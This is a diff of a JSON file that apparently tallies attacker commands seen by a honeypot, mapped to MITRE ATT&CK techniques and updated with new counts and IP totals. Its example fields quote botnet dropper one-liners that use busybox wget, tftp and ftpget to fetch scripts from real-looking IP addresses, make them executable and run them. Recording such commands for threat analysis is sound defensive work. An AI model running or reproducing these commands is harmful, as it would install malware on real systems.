@@ -7,7 +7,7 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 33200,
+      "count": 33206,
       "distinct_ips": 38,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\"",
@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 812,
-      "distinct_ips": 49,
+      "count": 828,
+      "distinct_ips": 50,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 2.26.136.128 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -41,8 +41,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 540,
-      "distinct_ips": 41,
+      "count": 543,
+      "distinct_ips": 42,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 2.26.136.128 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -131,6 +131,6 @@
       ]
     }
   ],
-  "total_commands": 59950,
-  "matched_commands": 34247
+  "total_commands": 60015,
+  "matched_commands": 34268
 }
